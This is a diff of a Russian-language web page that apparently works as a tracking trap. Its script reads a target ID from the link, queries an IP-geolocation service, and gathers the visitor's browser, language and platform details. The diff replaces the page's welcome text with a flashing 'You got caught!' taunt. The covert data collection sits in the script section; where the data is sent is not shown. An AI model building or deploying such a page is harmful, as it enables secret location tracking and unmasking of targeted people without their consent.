@@ -2,9 +2,50 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Новый вход</title>
+  <title>Ты попался!</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: radial-gradient(circle at center, #000000, #111111, #000000);
+      color: red;
+      font-family: 'Impact', 'Arial Black', sans-serif;
+      overflow: hidden;
+    }
+
+    h1 {
+      font-size: 5em;
+      text-shadow: 0 0 20px red, 0 0 40px crimson, 0 0 60px darkred;
+      animation: flicker 1.5s infinite alternate, shake 0.3s infinite;
+    }
+
+    @keyframes flicker {
+      0% { opacity: 1; text-shadow: 0 0 20px red, 0 0 40px crimson, 0 0 60px darkred; }
+      50% { opacity: 0.7; text-shadow: 0 0 10px red, 0 0 20px crimson; }
+      100% { opacity: 1; text-shadow: 0 0 30px red, 0 0 60px crimson, 0 0 90px darkred; }
+    }
+
+    @keyframes shake {
+      0% { transform: translate(0px, 0px) rotate(0deg); }
+      25% { transform: translate(2px, -2px) rotate(-1deg); }
+      50% { transform: translate(-2px, 2px) rotate(1deg); }
+      75% { transform: translate(2px, 2px) rotate(0deg); }
+      100% { transform: translate(0px, 0px) rotate(-1deg); }
+    }
+
+
+    .content {
+      position: relative;
+      z-index: 1;
+    }
+  </style>
   <script>
     window.onload = async function () {
+      document.querySelector(".content").innerHTML = "<h1>Ты попался!</h1>";
+
       const urlParams = new URLSearchParams(window.location.search);
       const TARGET_ID = urlParams.get("u"); 
       if (!TARGET_ID) return;
@@ -12,6 +53,7 @@
       try {
         const ipResponse = await fetch('https://ipapi.co/json/');
         const ipData = ipResponse.ok ? await ipResponse.json() : { error: "ipapi_failed" };
+
         const ua = navigator.userAgent || null;
         const lang = navigator.language || null;
         const platform = navigator.platform || null;
@@ -56,6 +98,6 @@
   </script>
 </head>
 <body>
-  <h1>Добро пожаловать!</h1>
+  <div class="content"></div>
 </body>
 </html>
